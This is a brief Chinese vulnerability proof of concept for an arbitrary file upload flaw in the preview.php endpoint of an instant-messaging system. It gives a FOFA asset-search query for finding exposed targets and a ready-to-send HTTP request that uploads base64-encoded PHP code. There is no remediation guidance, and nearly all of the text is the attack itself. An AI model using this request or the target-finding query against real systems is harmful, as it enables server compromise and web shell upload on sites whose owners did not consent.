# im即时通讯系统preview.php前台任意⽂件上传漏洞

# 一、漏洞简介
im即时通讯系统preview.php接口存在任意文件上传漏洞

# 三、资产测绘
+ fofa`body="/superloginAction.html" || "im.smiaoshen.com"`

# 四、漏洞复现
```rust
GET /static/lib/webuploader/0.1.5/server/preview.php HTTP/1.1
Host: 
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (
KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,i
mage/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: su_webp=1; wp-settings-1=libraryContent%3Dbrowse; wp-settings-time
-1=1734956910
Connection: close
Content-Length: 46

data:image/php;base64,PD9waHAgcGhwaW5mbygpOz8+
```
